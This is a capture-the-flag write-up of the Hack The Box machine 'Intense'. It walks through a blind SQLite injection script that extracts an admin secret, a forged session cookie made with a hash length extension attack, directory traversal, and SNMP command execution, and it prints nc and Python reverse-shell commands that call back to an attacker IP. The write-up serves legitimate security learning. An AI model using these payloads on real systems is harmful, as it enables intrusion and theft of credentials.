---
title: "Intense"
difficulty: Hard
os: Linux
points: 40
rating: 4.4
date: 2020-07-04
avatar: assets/htb/intense.png
tags: [SQL Injection, Buffer Overflow, Directory Listing, Binary Exploitation, Hash Length Extension Attack, ROP Chains, Python, C]
htb_url: https://app.hackthebox.com/machines/Intense
---
## Enumeration

### Nmap scan

I kicked things off by running nmap against `<YOUR_IP>`. My usual flags are: `-p-`, the shortcut that tells nmap to cover every port, `-sC` which is the same as `--script=default` and fires off nmap's default enumeration scripts at the target, `-sV` for service detection, and `-oA <name>` to write the results out under the filename `<name>`.

```text
┌──(kac0㉿kali)-[~/htb/intense]
└─$ nmap -n -v -sCV -p- <YOUR_IP> -oA intense  
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-01 20:13 EST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 20:13
Completed NSE at 20:13, 0.00s elapsed
Initiating NSE at 20:13
Completed NSE at 20:13, 0.00s elapsed
Initiating NSE at 20:13
Completed NSE at 20:13, 0.00s elapsed
Initiating Ping Scan at 20:13
Scanning <YOUR_IP> [2 ports]
Completed Ping Scan at 20:13, 0.05s elapsed (1 total hosts)
Initiating Connect Scan at 20:13
Scanning <YOUR_IP> [65535 ports]
Discovered open port 80/tcp on <YOUR_IP>
Discovered open port 22/tcp on <YOUR_IP>
Completed Connect Scan at 20:13, 22.38s elapsed (65535 total ports)
Initiating Service scan at 20:13
Scanning 2 services on <YOUR_IP>
Completed Service scan at 20:14, 6.14s elapsed (2 services on 1 host)
NSE: Script scanning <YOUR_IP>.
Initiating NSE at 20:14
Completed NSE at 20:14, 1.59s elapsed
Initiating NSE at 20:14
Completed NSE at 20:14, 0.25s elapsed
Initiating NSE at 20:14
Completed NSE at 20:14, 0.00s elapsed
Nmap scan report for <YOUR_IP>
Host is up (0.071s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b4:7b:bd:c0:96:9a:c3:d0:77:80:c8:87:c6:2e:a2:2f (RSA)
|   256 44:cb:fe:20:bb:8d:34:f2:61:28:9b:e8:c7:e9:7b:5e (ECDSA)
|_  256 28:23:8c:e2:da:54:ed:cb:82:34:a1:e3:b2:2d:04:ed (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Intense - WebApp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 20:14
Completed NSE at 20:14, 0.00s elapsed
Initiating NSE at 20:14
Completed NSE at 20:14, 0.00s elapsed
Initiating NSE at 20:14
Completed NSE at 20:14, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.86 seconds
```

The scan came back with just two open ports: 22 - SSH and 80 - HTTP. 

### Port 80 - HTTP

![](assets/wu/intense/img-1.png)

Since there wasn't much else, I opened the HTTP site on port 80 and was met by a page that handed me guest login credentials right up front.

> Hello ! You can login with the username and password guest.

The page also advertised that the project was open source and offered a download link for `src.zip`, which held the website's source code.

> This app is opensource !

![](assets/wu/intense/img-2.png)

Once I logged in as guest, I was shown the following message:

> One day, an old man said "there is no point using automated tools, better to craft his own".

I read this as a clue that automated tooling wouldn't get me what I needed from the site.

![](assets/wu/intense/img-3.png)

The `/submit` page contained an input field, which I naturally wanted to probe for bugs!  My first attempt was the classic `<script>alert('test')</script>` payload, and it immediately threw an interesting error.

![](assets/wu/intense/img-4.png)

What started as XSS testing pointed instead toward SQL injection, because the field clearly choked on single quotes.  Rather than keep poking blindly, I decided to dig into the `src.zip` I'd grabbed from the home page so I could figure out the right queries to build.

### Source Code Review

```text
┌──(kac0㉿kali)-[~/htb/intense]
└─$ tree app         
app
├── admin.py
├── app.py
├── lwt.py
├── static
│   ├── css
│   │   └── style.css
│   ├── img
│   │   ├── app-bg.png
│   │   ├── apple-touch-icon.png
│   │   ├── arrow1.png
│   │   ├── arrow2.png
│   │   ├── favicon.png
│   │   ├── intro01.png
│   │   ├── intro02.png
│   │   ├── intro03.png
│   │   ├── item-01.png
│   │   ├── item-02.png
│   │   └── mobile.png
│   ├── js
│   │   └── main.js
│   └── lib
│       ├── bootstrap
│       │   ├── css
│       │   │   ├── bootstrap.css
│       │   │   └── bootstrap.min.css
│       │   ├── fonts
│       │   │   ├── glyphicons-halflings-regular.eot
│       │   │   ├── glyphicons-halflings-regular.svg
│       │   │   ├── glyphicons-halflings-regular.ttf
│       │   │   ├── glyphicons-halflings-regular.woff
│       │   │   └── glyphicons-halflings-regular.woff2
│       │   └── js
│       │       ├── bootstrap.js
│       │       └── bootstrap.min.js
│       ├── easing
│       │   ├── easing.js
│       │   └── easing.min.js
│       ├── jquery
│       │   ├── jquery.js
│       │   └── jquery.min.js
│       └── php-mail-form
│           └── validate.js
├── templates
│   ├── admin.html
│   ├── footer.html
│   ├── header.html
│   ├── home.html
│   ├── index.html
│   ├── login.html
│   └── submit.html
└── utils.py

13 directories, 38 files
```

Inside `src.zip` were the site's source templates, all sitting under an `app` folder.  The most useful pieces were the Python files that drive the site through the Flask framework.

![](assets/wu/intense/img-5.png)

`admin.py` revealed a couple of new directory paths worth investigating. 

![](assets/wu/intense/img-6.png)

As I'd guessed, the `/admin` page returned a forbidden response.

![](assets/wu/intense/img-7.png)

The code showed that the two `/admin/log` paths expected POST requests instead of GET.  To get anything out of them I'd evidently need an admin session token.  

```http
Cookie: auth=dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7.7B6PiygW8lDO84yRQABGvGfw0ttyTDTwk0h+GEEFpgI=
```

Inspecting the request in Burp, I noticed a cookie header whose `auth` parameter held a base64-encoded string.

```http
Cookie: auth=username=guest;secret=84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec;ì(òPÎó@
```

Decoding the base64 revealed that the `auth` cookie held the username, a hex secret, and some trailing binary junk.  It seemed I'd need to obtain the secret for the `admin` user \(referenced in the source code\).

```python
from flask import Flask, request, render_template, g, redirect, url_for,\
    make_response
from utils import get_db, get_session, get_user, try_login, query_db, badword_in_str
from admin import admin
import sqlite3
import lwt

app = Flask(__name__)

app.register_blueprint(admin)

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

@app.route('/submit', methods=["GET"])
def submit():
    session = get_session(request)
    if session:
        user = get_user(session["username"], session["secret"])
        return render_template("submit.html", page="submit", user=user)
    return render_template("submit.html", page="submit")

@app.route("/submitmessage", methods=["POST"])
def submitmessage():
    message = request.form.get("message", '')
    if len(message) > 140:
        return "message too long"
    if badword_in_str(message):
        return "forbidden word in message"
    # insert new message in DB
    try:
        query_db("insert into messages values ('%s')" % message)
    except sqlite3.Error as e:
        return str(e)
    return "OK"

@app.route("/login", methods=["GET"])
def login():
    return render_template("login.html", page="login")

@app.route("/postlogin", methods=["POST"])
def postlogin():
    # return user's info if exists
    data = try_login(request.form)
    if data:
        resp = make_response("OK")
        # create new cookie session to authenticate user
        session = lwt.create_session(data)
        cookie = lwt.create_cookie(session)
        resp.set_cookie("auth", cookie)
        return resp
    return "Login failed"

@app.route("/logout")
def logout():
    resp = make_response("<script>document.location.href='/';</script>")
    resp.set_cookie("auth", "", expires=0)
    return resp

@app.route("/")
@app.route("/home")
def index():
    session = get_session(request)
    if session and "username" in session:
        user = get_user(session["username"], session["secret"])
        print(user)
        return render_template("home.html", page="home", user=user)
    return render_template("home.html", page="home")

if __name__ == "__main__":
    app.run()
```

`app.py` held several methods worth noting.  The `submitmessage` route capped submissions at 140 characters and ran some kind of "bad word" filter on the input, then stored the message in the database if it cleared both checks.

```python
from hashlib import sha256
from base64 import b64decode, b64encode
from random import randrange
import os

SECRET = os.urandom(randrange(8, 15))

class InvalidSignature(Exception):
    pass

def sign(msg):
    """ Sign message with secret key """
    return sha256(SECRET + msg).digest()

def verif_signature(data, sig):
    """ Verify if the supplied signature is valid """
    return sign(data) == sig

def parse_session(cookie):
    """ Parse cookie and return dict
        @cookie: "key1=value1;key2=value2"

        return {"key1":"value1","key2":"value2"}
    """
    b64_data, b64_sig = cookie.split('.')
    data = b64decode(b64_data)
    sig = b64decode(b64_sig)
    if not verif_signature(data, sig):
        raise InvalidSignature
    info = {}
    for group in data.split(b';'):
        try:
            if not group:
                continue
            key, val = group.split(b'=')
            info[key.decode()] = val
        except Exception:
            continue
    return info

def create_session(data):
    """ Create session based on dict
        @data: {"key1":"value1","key2":"value2"}

        return "key1=value1;key2=value2;"
    """
    session = ""
    for k, v in data.items():
        session += f"{k}={v};"
    return session.encode()

def create_cookie(session):
    cookie_sig = sign(session)
    return b64encode(session) + b'.' + b64encode(cookie_sig)
```

`lwt.py` was responsible for building the session and the cookie.  It also explained the junk at the tail of the string: a signature made from the sha256 digest of the remainder of the `auth` value.

```python
import lwt
import sqlite3
from hashlib import sha256
from flask import g
from os import listdir, path
import datetime

DATABASE = "database.db"

class User:
    def __str__(self):
        return "User(username=%s,role=%d)" % (self.username,
                                              self.role)

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
    return db

def log_login(user):
    now = datetime.datetime.now()
    d = now.strftime("%Y-%m-%d")
    with open(f"logs/{d}.log", 'a') as log:
        log.write(str(user) + ' logged\n')

def badword_in_str(data):
    data = data.lower()
    badwords = ["rand", "system", "exec", "date"]
    for badword in badwords:
        if badword in data:
            return True
    return False

def hash_password(password):
    """ Hash password with a secure hashing function """
    return sha256(password.encode()).hexdigest()

def query_db(query, args=(), one=False):
    cur = get_db().execute(query, args)
    rv = cur.fetchall()
    cur.close()
    return (rv[0] if rv else None) if one else rv

def get_user(username, secret):
    """ Returns User object if given username/secret exist in DB """
    username = username.decode()
    secret = secret.decode()
    res = query_db("select role from users where username = ? and secret = ?", (username, secret), one=True)
    if res:
        user = User()
        user.username = username
        user.role = res[0]
        log_login(user)
        return user
    return None

def try_login(form):
    """ Try to login with the submitted user info """
    if not form:
        return None
    username = form["username"]
    password = hash_password(form["password"])
    result = query_db("select count(*) from users where username = ? and secret = ?", (username, password), one=True)
    if result and result[0]:
        return {"username": username, "secret":password}
    return None

def get_session(request):
    """ Get user session and parse it """
    if not request.cookies:
        return 
    if "auth" not in request.cookies:
        return
    cookie = request.cookies.get("auth")
    try:
        info = lwt.parse_session(cookie)
    except lwt.InvalidSignature:
        return {"status": -1, "msg": "Invalid signature"}
    return info

def is_admin(request):
    session = get_session(request)
    if not session:
        return None
    if "username" not in session or "secret" not in session:
        return None
    user = get_user(session["username"], session["secret"])
    return user.role == 1

#### Logs functions ####
def admin_view_log(filename):
    if not path.exists(f"logs/{filename}"):
        return f"Can't find {filename}"
    with open(f"logs/{filename}") as out:
        return out.read()

def admin_list_log(logdir):
    if not path.exists(f"logs/{logdir}"):
        return f"Can't find {logdir}"
    return listdir(logdir)
```

`utils.py` was the last file and held several useful methods too. `is_admin()` revealed that the `admin` user carries a role of `1` in the database, `get_user()` and `try_login()` handed me sample SQL queries to work from, and `badword_in_str()` listed the filtered words `["rand", "system", "exec", "date"]` I'd need to steer clear of.  It was clear I couldn't run code outright through the injection and would instead have to extract the data I was after.

### SQLite SQL Injection

![](assets/wu/intense/img-8.png)

Drawing on `utils.py`, I built the query `' AND select secret from users where username = admin and role =1`, only to hit another syntax error.  

![](assets/wu/intense/img-9.png)

`a') UNION SELECT password FROM users --` produced the error `no such column: password`. Swapping 'password' for 'secret', though, let the message go through cleanly with no errors.  Because the source confirmed the backend was sqlite3, I read up on how SQL injection works against that database.  A handful of resources helped clear up my mistakes.

* [https://stackoverflow.com/questions/62803167/how-to-make-the-sql-injection-on-insert-work-on-sqlite](https://stackoverflow.com/questions/62803167/how-to-make-the-sql-injection-on-insert-work-on-sqlite)
* [https://stackoverflow.com/questions/15513854/sqlite3-warning-you-can-only-execute-one-statement-at-a-time](https://stackoverflow.com/questions/15513854/sqlite3-warning-you-can-only-execute-one-statement-at-a-time)

It turned out the errors on semicolons were due to only one query being allowed per statement. The first link above offers a Stack Overflow workaround for exactly that.

> Ok so I've spent some time working on this and there is a way to make it work. You can interrogate sqlite on queries like: "SELECT CASE WHEN \(SELECT SUBSTRING\(password, 1, 1\)\) = 'a' THEN 1 END". You can write a simple python script that changes the 1 inside substring and the 'a' char. In this way you can pretty much bruteforce the output of the column. – RobertM Jul 16 at 19:11

It looked like brute-forcing the secret one character at a time was the way to go. Since this query style was new to me, I read up further on how to construct it.

* [https://www.sqlitetutorial.net/sqlite-case/](https://www.sqlitetutorial.net/sqlite-case/)

My output kept matching only a zero `'0'` for the secret until I searched for SQLite3 error-based injection and turned up a \(russian-language\) page demonstrating how MATCH makes this work.  [https://translate.google.com/translate?hl=en&sl=ru&u=https://rdot.org/forum/showthread.php%3Fp%3D26419&prev=search](https://translate.google.com/translate?hl=en&sl=ru&u=https://rdot.org/forum/showthread.php%3Fp%3D26419&prev=search)

![](assets/wu/intense/img-10.png)

There was still a snag, though, as the MATCH\(\) method didn't appear usable in this situation.

![](assets/wu/intense/img-11.png)

I also fat-fingered the SUBSTR method, and the tedium of firing single queries through the website got to me, so I switched to Burp Suite to speed up my testing.  Eventually I ironed out the issues and landed on a working query.  

![](assets/wu/intense/img-12.png)

To check the idea, I used Burp's Intruder to brute force the first character of the 'secret' string across all alpha-numeric characters.

![](assets/wu/intense/fix-22.png)

I configured Intruder to fuzz only one character of the query at a time.

![](assets/wu/intense/img-14.png)

When the fuzzer finished, it showed the admin secret's first character was `'f'`, the lone request that returned an HTTP 200 OK.

### Using python to brute force

```bash
┌──(kac0㉿kali)-[~/htb/intense]
└─$ echo -n '84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec' | wc -c
64
```

Using the cookie I already held, I extracted the secret `84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec`, which came out to 64 characters.  That told me how many characters the admin secret would require. With that, I wrote a Python brute forcer to step through all 64 characters of the secret. The resources below helped:

* To get all alpha-numeric chars: [https://stackoverflow.com/questions/5891453/is-there-a-python-library-that-contains-a-list-of-all-the-ascii-characters](https://stackoverflow.com/questions/5891453/is-there-a-python-library-that-contains-a-list-of-all-the-ascii-characters)
* To print output dynamically on one line: [https://stackoverflow.com/questions/3249524/print-in-one-line-dynamically](https://stackoverflow.com/questions/3249524/print-in-one-line-dynamically)
* To get the run-time of a program or method: [https://stackoverflow.com/questions/1557571/how-do-i-get-time-of-a-python-programs-execution](https://stackoverflow.com/questions/1557571/how-do-i-get-time-of-a-python-programs-execution)

```python
import requests
import string
import time

url = "http://<YOUR_IP>/submitmessage"
guest_secret = "dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7.yUJDSrHY6MXeDWIMvm6WVBrBiI11ILXthKcNc22KYMY="
referer = "http://<YOUR_IP>/submit"

def get_secret():
    secret = ""
    print("The secret for admin is: ", sep="", end="", flush=True)
    for i in range(64):
        for char in string.printable:
            
            #range(n) starts at 0 and ends at n-1, so need to add 1 when selecting which string location to brute force
            sql_query = "' AND (SELECT CASE WHEN ((SELECT hex(substr(secret,"+str(i+1)+",1)) FROM users WHERE role=1) = hex('"+str(char)+"')) THEN 1 ELSE MATCH(1,1) END))--"
            message = requests.post(url, cookies = { "auth" : guest_secret , "Referer" : referer }, data = { "message" : sql_query }).text
            
            # since error messages start with the word "unable", use this to filter out the correct letter
            if not "unable" in message:
                print(char, sep="", end="", flush=True)
                secret += char
                break

start_time = time.time()

get_secret()

print("")
print("Total runtime: ")
print("--- %s seconds ---" % (time.time() - start_time))
```

The finished script was pretty compact, mostly just assembling a request carrying the SQL injection payload.  It then looped through every printable ASCII character at each of the 64 positions of the secret.  I tacked on a small timer to measure how long brute-forcing the full secret would take.

```text
┌──(kac0㉿kali)-[~/htb/intense]
└─$ python3 ./secret-brute-force.py 
Iterating through all 64 chars in the secret: 
The secret for admin is: f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105
Total runtime: 
--- 48.5825309753418 seconds ---
```

The brute force ran quite fast!  Per the timer, the entire string was recovered in under 50 seconds.

```text
auth=username=admin;secret=f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105;ÉBCJ±ØèÅÞ
b¾nTÁu µí§
sm`Æ
```

I then assembled my new `auth` cookie, ran it through `base64`, and ended up with: `dXNlcm5hbWU9YWRtaW47c2VjcmV0PWYxZmMxMjAxMGMwOTQwMTZkZWY3OTFlMTQzNWRkZmRjYWVjY2Y4MjUwZTM2NjMwYzBiYzkzMjg1YzI5NzExMDU7yUJDSrHY6MXeDWIMvm6WVBrBiI11ILXthKcNc22KYMY=`

![](assets/wu/intense/img-15.png)

That cookie, however, broke the entire site so that no pages would render. I suspected it was tied to the unreadable signature bytes appended to the secret in the cookie.

```python
def sign(msg):
    """ Sign message with secret key """
    return sha256(SECRET + msg).digest()

def verif_signature(data, sig):
    """ Verify if the supplied signature is valid """
    return sign(data) == sig

def parse_session(cookie):
    """ Parse cookie and return dict
        @cookie: "key1=value1;key2=value2"

        return {"key1":"value1","key2":"value2"}
    """
    b64_data, b64_sig = cookie.split('.')
    data = b64decode(b64_data)
    sig = b64decode(b64_sig)
    if not verif_signature(data, sig):
        raise InvalidSignature
    info = {}
    for group in data.split(b';'):
        try:
            if not group:
                continue
            key, val = group.split(b'=')
            info[key.decode()] = val
        except Exception:
            continue
    return info
```

Returning to the `lwt.py` source gave me the answer.  The portion after the `;` was a signature produced by running `sha256` over `secret + MSG`.

```python
def create_cookie(session):
    cookie_sig = sign(session)
    return b64encode(session) + b'.' + b64encode(cookie_sig)
```

To produce the signature, I'd have to use the `create_cookie()` method above to encode and sign the username and secret.

[https://github.com/bwall/HashPump](https://github.com/bwall/HashPump)

```python

```

implementing hashpumpy...

```text
dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMQO3VzZXJuYW1lPWFkbWluO3NlY3JldD1mMWZjMTIwMTBjMDk0MDE2ZGVmNzkxZTE0MzVkZGZkY2FlY2NmODI1MGUzNjYzMGMwYmM5MzI4NWMyOTcxMTA1Ow==.IZp1w+kV4OqLepjmgjxZR6/bcZXtV138PqZiZdxNoGg=
```

The final admin cookie was:

```text
Cookie: auth=username=guest;secret=84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec;username=admin;secret=f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105;.!uÃéàêzæ<YG¯ÛqíW]ü>¦beÜM h
```

For whatever reason, `hashpumpy` tacked the guest cookie onto the admin cookie and then appended a signature over both combined.

![](assets/wu/intense/img-16.png)

This oversized cookie nonetheless worked, and I logged into the `/admin` page without a hitch.  

## Initial Foothold

### Remote Code Execution \(Limited\)

Back in `admin.py`, it referenced the `logfile` and `logdir` properties on their respective directories, used together with a POST request after authenticating as admin.  This screamed Burp Repeater.

![](assets/wu/intense/img-17.png)

The `logfile` property was vulnerable to directory traversal, and through Burp I pulled down `/etc/passwd`.  Only two users could actually log in: `root` and `user`. An odd account named `debian_snmp` caught my eye, so I figured I'd see what the SNMP service might offer. \(A follow-up nmap scan showed UDP port 161 open, which is the default SNMP port!\)

![](assets/wu/intense/img-18.png)

Reviewing the SNMP config files, I spotted a read/write community string of `SuP3RPrivCom90` in `snmpd.conf`.

![](assets/wu/intense/img-19.png)

ssh.conf - nothing useful

![](assets/wu/intense/img-20.png)

I also leveraged the logdir property to list the contents of `/home/user`.  That directory held `user.txt`, confirming I was headed the right way.

### User.txt

![](assets/wu/intense/img-21.png)

This was a fun one...it's pretty rare that I grab the user flag purely over web requests.

![](assets/wu/intense/img-22.png)

I also looked for an `authorized_keys` file, since it's an excellent route to persistence.

### Enumerating SNMP

Next I spent some time figuring out how to turn the community string I'd found into access on the box.  A great blog walked me through exactly how to land a shell via SNMP.

* [https://digi.ninja/blog/snmp\_to\_shell.php](https://digi.ninja/blog/snmp_to_shell.php)

```text
snmpwalk:

snmpwalk -v 2c -c <community-string> host-with-snmpd.lan

Set SNMP tools to show OID human readable names instead of numbers:

apt-get install snmp-mibs-downloader download-mibs
echo "" > /etc/snmp/snmp.conf
```

installed snmp MIBs

```text
┌──(kac0㉿kali)-[~/htb/intense]
└─$ snmpwalk -v 2c -c SuP3RPrivCom90 <YOUR_IP>                                                   2 ⚙
SNMPv2-MIB::sysDescr.0 = STRING: Linux intense 4.15.0-55-generic #60-Ubuntu SMP Tue Jul 2 18:22:20 UTC 2019 x86_64
SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (5436351) 15:06:03.51
SNMPv2-MIB::sysContact.0 = STRING: Me <user@intense.htb>
SNMPv2-MIB::sysName.0 = STRING: intense
SNMPv2-MIB::sysLocation.0 = STRING: Sitting on the Dock of the Bay
SNMPv2-MIB::sysServices.0 = INTEGER: 72
SNMPv2-MIB::sysORLastChange.0 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORID.1 = OID: SNMP-MPD-MIB::snmpMPDCompliance
SNMPv2-MIB::sysORID.2 = OID: SNMP-USER-BASED-SM-MIB::usmMIBCompliance
SNMPv2-MIB::sysORID.3 = OID: SNMP-FRAMEWORK-MIB::snmpFrameworkMIBCompliance
SNMPv2-MIB::sysORID.4 = OID: SNMPv2-MIB::snmpMIB
SNMPv2-MIB::sysORID.5 = OID: SNMP-VIEW-BASED-ACM-MIB::vacmBasicGroup
SNMPv2-MIB::sysORID.6 = OID: TCP-MIB::tcpMIB
SNMPv2-MIB::sysORID.7 = OID: IP-MIB::ip
SNMPv2-MIB::sysORID.8 = OID: UDP-MIB::udpMIB
SNMPv2-MIB::sysORID.9 = OID: SNMP-NOTIFICATION-MIB::snmpNotifyFullCompliance
SNMPv2-MIB::sysORID.10 = OID: NOTIFICATION-LOG-MIB::notificationLogMIB
SNMPv2-MIB::sysORDescr.1 = STRING: The MIB for Message Processing and Dispatching.
SNMPv2-MIB::sysORDescr.2 = STRING: The management information definitions for the SNMP User-based Security Model.
SNMPv2-MIB::sysORDescr.3 = STRING: The SNMP Management Architecture MIB.
SNMPv2-MIB::sysORDescr.4 = STRING: The MIB module for SNMPv2 entities
SNMPv2-MIB::sysORDescr.5 = STRING: View-based Access Control Model for SNMP.
SNMPv2-MIB::sysORDescr.6 = STRING: The MIB module for managing TCP implementations
SNMPv2-MIB::sysORDescr.7 = STRING: The MIB module for managing IP and ICMP implementations
SNMPv2-MIB::sysORDescr.8 = STRING: The MIB module for managing UDP implementations
SNMPv2-MIB::sysORDescr.9 = STRING: The MIB modules for managing SNMP Notification, plus filtering.
SNMPv2-MIB::sysORDescr.10 = STRING: The MIB module for logging SNMP Notifications.
```

Not much information gained from SNMP walk

```text
┌──(kac0㉿kali)-[~/htb/intense]
└─$ snmpwalk -v 2c -c SuP3RPrivCom90 <YOUR_IP> nsExtendOutput1                             130 ⨯ 2 ⚙
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."test1" = STRING: Hello, world!
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."test2" = STRING: Hello, world!
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."test1" = STRING: Hello, world!
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."test2" = STRING: Hello, world!
Hi there
NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."test1" = INTEGER: 1
NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."test2" = INTEGER: 2
NET-SNMP-EXTEND-MIB::nsExtendResult."test1" = INTEGER: 0
NET-SNMP-EXTEND-MIB::nsExtendResult."test2" = INTEGER: 8960
```

[https://medium.com/rangeforce/snmp-arbitrary-command-execution-19a6088c888e](https://medium.com/rangeforce/snmp-arbitrary-command-execution-19a6088c888e)

> snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c   host-with-snmpd.lan  'nsExtendStatus."command"' = createAndGo  'nsExtendCommand."command"' = /bin/echo  'nsExtendArgs."command"' = 'hello world'

```text
┌──(kac0㉿kali)-[~/htb/intense]
└─$ snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 <YOUR_IP> 'nsExtendStatus."command"' = createAndGo 'nsExtendCommand."command"' = '/bin/nc 10.10.15.100 55541 -e /bin/bash' 'nsExtendArgs."command"'    = 'hello world' 
NET-SNMP-EXTEND-MIB::nsExtendStatus."command" = INTEGER: createAndGo(4)
NET-SNMP-EXTEND-MIB::nsExtendCommand."command" = STRING: /bin/nc 10.10.15.100 55541 -e /bin/bash
NET-SNMP-EXTEND-MIB::nsExtendArgs."command" = STRING: hello world
```

created my command to send nc reverse shell

```text
┌──(kac0㉿kali)-[~/htb/intense]
└─$ snmpwalk -v 2c -c SuP3RPrivCom90 <YOUR_IP> nsExtendOutput1                                   2 ⚙
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."test1" = STRING: Hello, world!
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."test2" = STRING: Hello, world!
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."command" = STRING: /bin/nc: invalid option -- 'e'
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."test1" = STRING: Hello, world!
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."test2" = STRING: Hello, world!
Hi there
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."command" = STRING: /bin/nc: invalid option -- 'e'
usage: nc [-46CDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl]
          [-m minttl] [-O length] [-P proxy_username] [-p source_port]
          [-q seconds] [-s source] [-T keyword] [-V rtable] [-W recvlimit] [-w timeout]
          [-X proxy_protocol] [-x proxy_address[:port]]           [destination] [port]
NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."test1" = INTEGER: 1
NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."test2" = INTEGER: 2
NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."command" = INTEGER: 5
NET-SNMP-EXTEND-MIB::nsExtendResult."test1" = INTEGER: 0
NET-SNMP-EXTEND-MIB::nsExtendResult."test2" = INTEGER: 8960
NET-SNMP-EXTEND-MIB::nsExtendResult."command" = INTEGER: 1
```

Unfortunately the `nc` build on the target lacked `-e` support, so I couldn't get it to fire a reverse shell back to me.

## Getting a shell

```text
┌──(kac0㉿kali)-[~/htb/intense]
└─$ snmpwalk -v 2c -c SuP3RPrivCom90 <YOUR_IP> nsExtendOutput1                                   2 ⚙
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."test1" = STRING: Hello, world!
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."test2" = STRING: Hello, world!
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."command" = STRING:   File "<string>", line 1
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."test1" = STRING: Hello, world!
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."test2" = STRING: Hello, world!
Hi there
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."command" = STRING:   File "<string>", line 1
    "import
          ^
SyntaxError: EOL while scanning string literal
NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."test1" = INTEGER: 1
NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."test2" = INTEGER: 2
NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."command" = INTEGER: 4
NET-SNMP-EXTEND-MIB::nsExtendResult."test1" = INTEGER: 0
NET-SNMP-EXTEND-MIB::nsExtendResult."test2" = INTEGER: 8960
NET-SNMP-EXTEND-MIB::nsExtendResult."command" = INTEGER: 1

┌──(kac0㉿kali)-[~/htb/intense]
└─$ snmpwalk -v 2c -c SuP3RPrivCom90 <YOUR_IP> nsExtendOutput1                                   2 ⚙
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."test1" = STRING: Hello, world!
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."test2" = STRING: Hello, world!
Timeout: No Response from <YOUR_IP>
```

I attempted a reverse shell but ran into an End-of-Line error

```text
┌──(kac0㉿kali)-[~/htb/intense]
└─$ snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 <YOUR_IP> 'nsExtendStatus."command"' = createAndGo 'nsExtendCommand."command"' = '/usr/bin/python3' 'nsExtendArgs."command"' = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"10.10.15.100\",55541));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"' 
NET-SNMP-EXTEND-MIB::nsExtendStatus."command" = INTEGER: createAndGo(4)
NET-SNMP-EXTEND-MIB::nsExtendCommand."command" = STRING: /usr/bin/python3
